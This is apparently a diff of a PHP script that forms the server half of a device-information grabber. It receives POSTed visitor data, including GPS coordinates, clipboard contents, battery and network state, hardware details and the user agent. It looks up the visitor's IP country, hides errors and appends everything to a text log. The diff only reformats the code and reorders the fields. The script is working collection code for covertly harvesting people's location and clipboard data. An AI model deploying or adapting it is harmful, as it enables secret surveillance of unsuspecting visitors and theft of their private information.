@@ -1,5 +1,6 @@
 <?php
 error_reporting(0);
+
 $networkinfo = $_POST['networkinformation'];
 $batterypercentage = $_POST['batterypercentage'];
 $ischarging = $_POST['ischarging'];
@@ -15,13 +16,31 @@ $deviceram = $_POST['deviceram'];
 $cpuThreads = $_POST['cpuThreads'];
 $referurl = $_POST['referurl'];
 $clipboard = $_POST['clipboard'];
+
 $ip = $_SERVER['REMOTE_ADDR'];
 $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 $ulke = $details->country;
+
 date_default_timezone_set('Asia/Karachi');
-$tarih=date("d-m-Y H:i:s");
+$tarih = date("d-m-Y H:i:s");
+
 $file = fopen('info.txt', 'a');
-fwrite($file, "Ip Address: " .$ip."\n\n".
-"Country: ".$ulke ."\n\n"."NetworkInformation: ".$networkinfo."\n\n"."Batterypercentage: ".$batterypercentage."\n\n"."Ischarging: ".$ischarging."\n\n"."ScreenWidth: ".$width."\n\n" ."ScreeHeight: ".$height."\n\n" ."Platform: ".$platform."\n\n" ."GPS: ".$gps."\n\n" ."DeviceLocalTime: ".$localtime."\n\n" ."DeviceLanguage: ".$devicelang."\n\n" ."CookieEnabled: ".$iscookieEnabled."\n\n" ."UserAgent: ".$useragent."\n\n" ."DeviceMemory: ".$deviceram."\n\n" ."CPuThreads: ".$cpuThreads."\n\n" ."Clipboard: ".$clipboard."\n\n"."ReferUrl: ".$referurl."\n\n\n\n");
+fwrite($file, "Ip Address: " . $ip . "\n" .
+    "Country: " . $ulke . "\n" .
+    "NetworkInformation: " . $networkinfo . "\n" .
+    "BatteryPercentage: " . $batterypercentage . "\n" .
+    "IsCharging: " . $ischarging . "\n" .
+    "ScreenWidth: " . $width . "\n" .
+    "ScreenHeight: " . $height . "\n" .
+    "Platform: " . $platform . "\n" .
+    "GPS: " . $gps . "\n" .
+    "DeviceLocalTime: " . $localtime . "\n" .
+    "DeviceLanguage: " . $devicelang . "\n" .
+    "CookieEnabled: " . $iscookieEnabled . "\n" .
+    "UserAgent: " . $useragent . "\n" .
+    "DeviceMemory: " . $deviceram . "\n" .
+    "CpuThreads: " . $cpuThreads . "\n" .
+    "ReferUrl: " . $referurl . "\n" .
+    "Clipboard: " . $clipboard . "\n\n");
 fclose($file);
 ?>
